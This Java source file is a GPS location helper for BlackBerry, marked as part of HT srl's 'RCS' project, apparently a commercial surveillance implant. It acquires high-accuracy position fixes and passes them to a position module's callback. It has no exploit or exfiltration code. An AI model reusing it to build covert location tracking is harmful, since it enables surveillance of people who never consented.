//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.location;

import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.RuntimeStore;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public final class LocationHelper {

    private long STOP_DELAY = 5 * 60 * 1000;
    //#ifdef DEBUG
    static Debug debug = new Debug("LocationHelper", DebugLevel.VERBOSE);
    //#endif

    private static LocationHelper instance;
    private static long GUID = 0xb6b1c761129a5249L;

    public synchronized static LocationHelper getInstance() {
        if (instance == null) {
            instance = (LocationHelper) RuntimeStore.getRuntimeStore()
                    .get(GUID);
            if (instance == null) {
                final LocationHelper singleton = new LocationHelper();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    private LocationProvider lp;

    private LocationHelper() {
        final Application application = Application.getApplication();
        
        final Criteria criteria = new Criteria();
        criteria.setCostAllowed(true);

        criteria.setHorizontalAccuracy(50);
        criteria.setVerticalAccuracy(50);
        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);
        
        try {
            lp = LocationProvider.getInstance(criteria);
        } catch (LocationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("LocationHelper");
            //#endif
        }
        
        if (lp == null) {
            //#ifdef DEBUG
            debug.error("GPS Not Supported on Device");
            //#endif               

        }
    }

    public void start( final LocationObserver callback, boolean sync) {
        final Runnable closure = new Runnable() {
            public void run() {
                //#ifdef DEBUG
                Debug.init();
                //#endif
                
                //#ifdef DEBUG
                debug.trace("run LocationHelper");
                //#endif
                
                try {
                    callback.waitingForPoint(true);
                    if (lp.getState() == LocationProvider.AVAILABLE) {
                        //#ifdef DEBUG
                        debug.trace("getLocation");
                        //#endif
                        final Location loc = lp.getLocation(Conf.GPS_TIMEOUT);
                        callback.newLocation(loc);
                    }
                } catch (final LocationException e) {
                    if (e.getMessage() == "Timed out while waiting for GPS") {
                        //#ifdef DEBUG
                        debug.error(e.getMessage());
                        //#endif
                    } else {
                        //#ifdef DEBUG
                        debug.error(e);
                        //#endif
                    }
                    callback.errorLocation();
                } catch (final InterruptedException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                    callback.errorLocation();
                }catch(Exception e){
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                } finally {
                    callback.waitingForPoint(false);
                }
                //#ifdef DEBUG
                debug.trace("run LocationHelper end");
                //#endif
            }
            
           
        };

        if (sync) {
            //#ifdef DEBUG
            debug.trace("start sync");
            //#endif
            closure.run();
        } else {
            //#ifdef DEBUG
            debug.trace("start async");
            //#endif
            //Status.self().getTimer().schedule(task,STOP_DELAY);            
            new Thread(closure).start();
        }
        
        //#ifdef DEBUG
        debug.trace("start ended");
        //#endif
    }

    public void stop(LocationObserver modulePosition) {
        //#ifdef DEBUG
        debug.trace("stop");
        //#endif
        if(lp!=null){
            lp.reset();
        }
        
    }

}
